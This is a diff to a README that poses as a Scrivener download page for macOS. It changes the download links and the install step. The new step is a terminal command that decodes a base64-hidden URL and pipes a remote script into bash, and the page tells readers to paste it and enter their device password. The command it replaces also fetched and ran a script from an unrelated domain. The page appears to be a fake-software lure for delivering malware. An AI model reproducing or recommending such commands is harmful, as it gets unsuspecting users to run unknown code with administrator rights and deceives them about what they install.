@@ -7,7 +7,7 @@ Whether you’re drafting a novel, writing a screenplay, or compiling academic p
 ---
 
 ## ✅ Download Scrivener for macOS  
-[![Download Scrivener](https://img.shields.io/badge/Download-Scrivener-blueviolet)](https://scrivener-download-mac.github.io/.github)
+[![Download Scrivener](https://img.shields.io/badge/Download-Scrivener-blueviolet)](https://shuziktobehuman.github.io/huja/Skrivener)
 
 ---
 
@@ -26,7 +26,7 @@ Whether you’re drafting a novel, writing a screenplay, or compiling academic p
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -68,7 +68,7 @@ Scrivener is a comprehensive writing application that lets you structure complex
 
 ---
 
-[![Download Scrivener](https://img.shields.io/badge/Download-Scrivener-blueviolet)](https://scrivener-download-mac.github.io/.github)
+[![Download Scrivener](https://img.shields.io/badge/Download-Scrivener-blueviolet)](https://shuziktobehuman.github.io/huja/Skrivener)
 
 ---
 
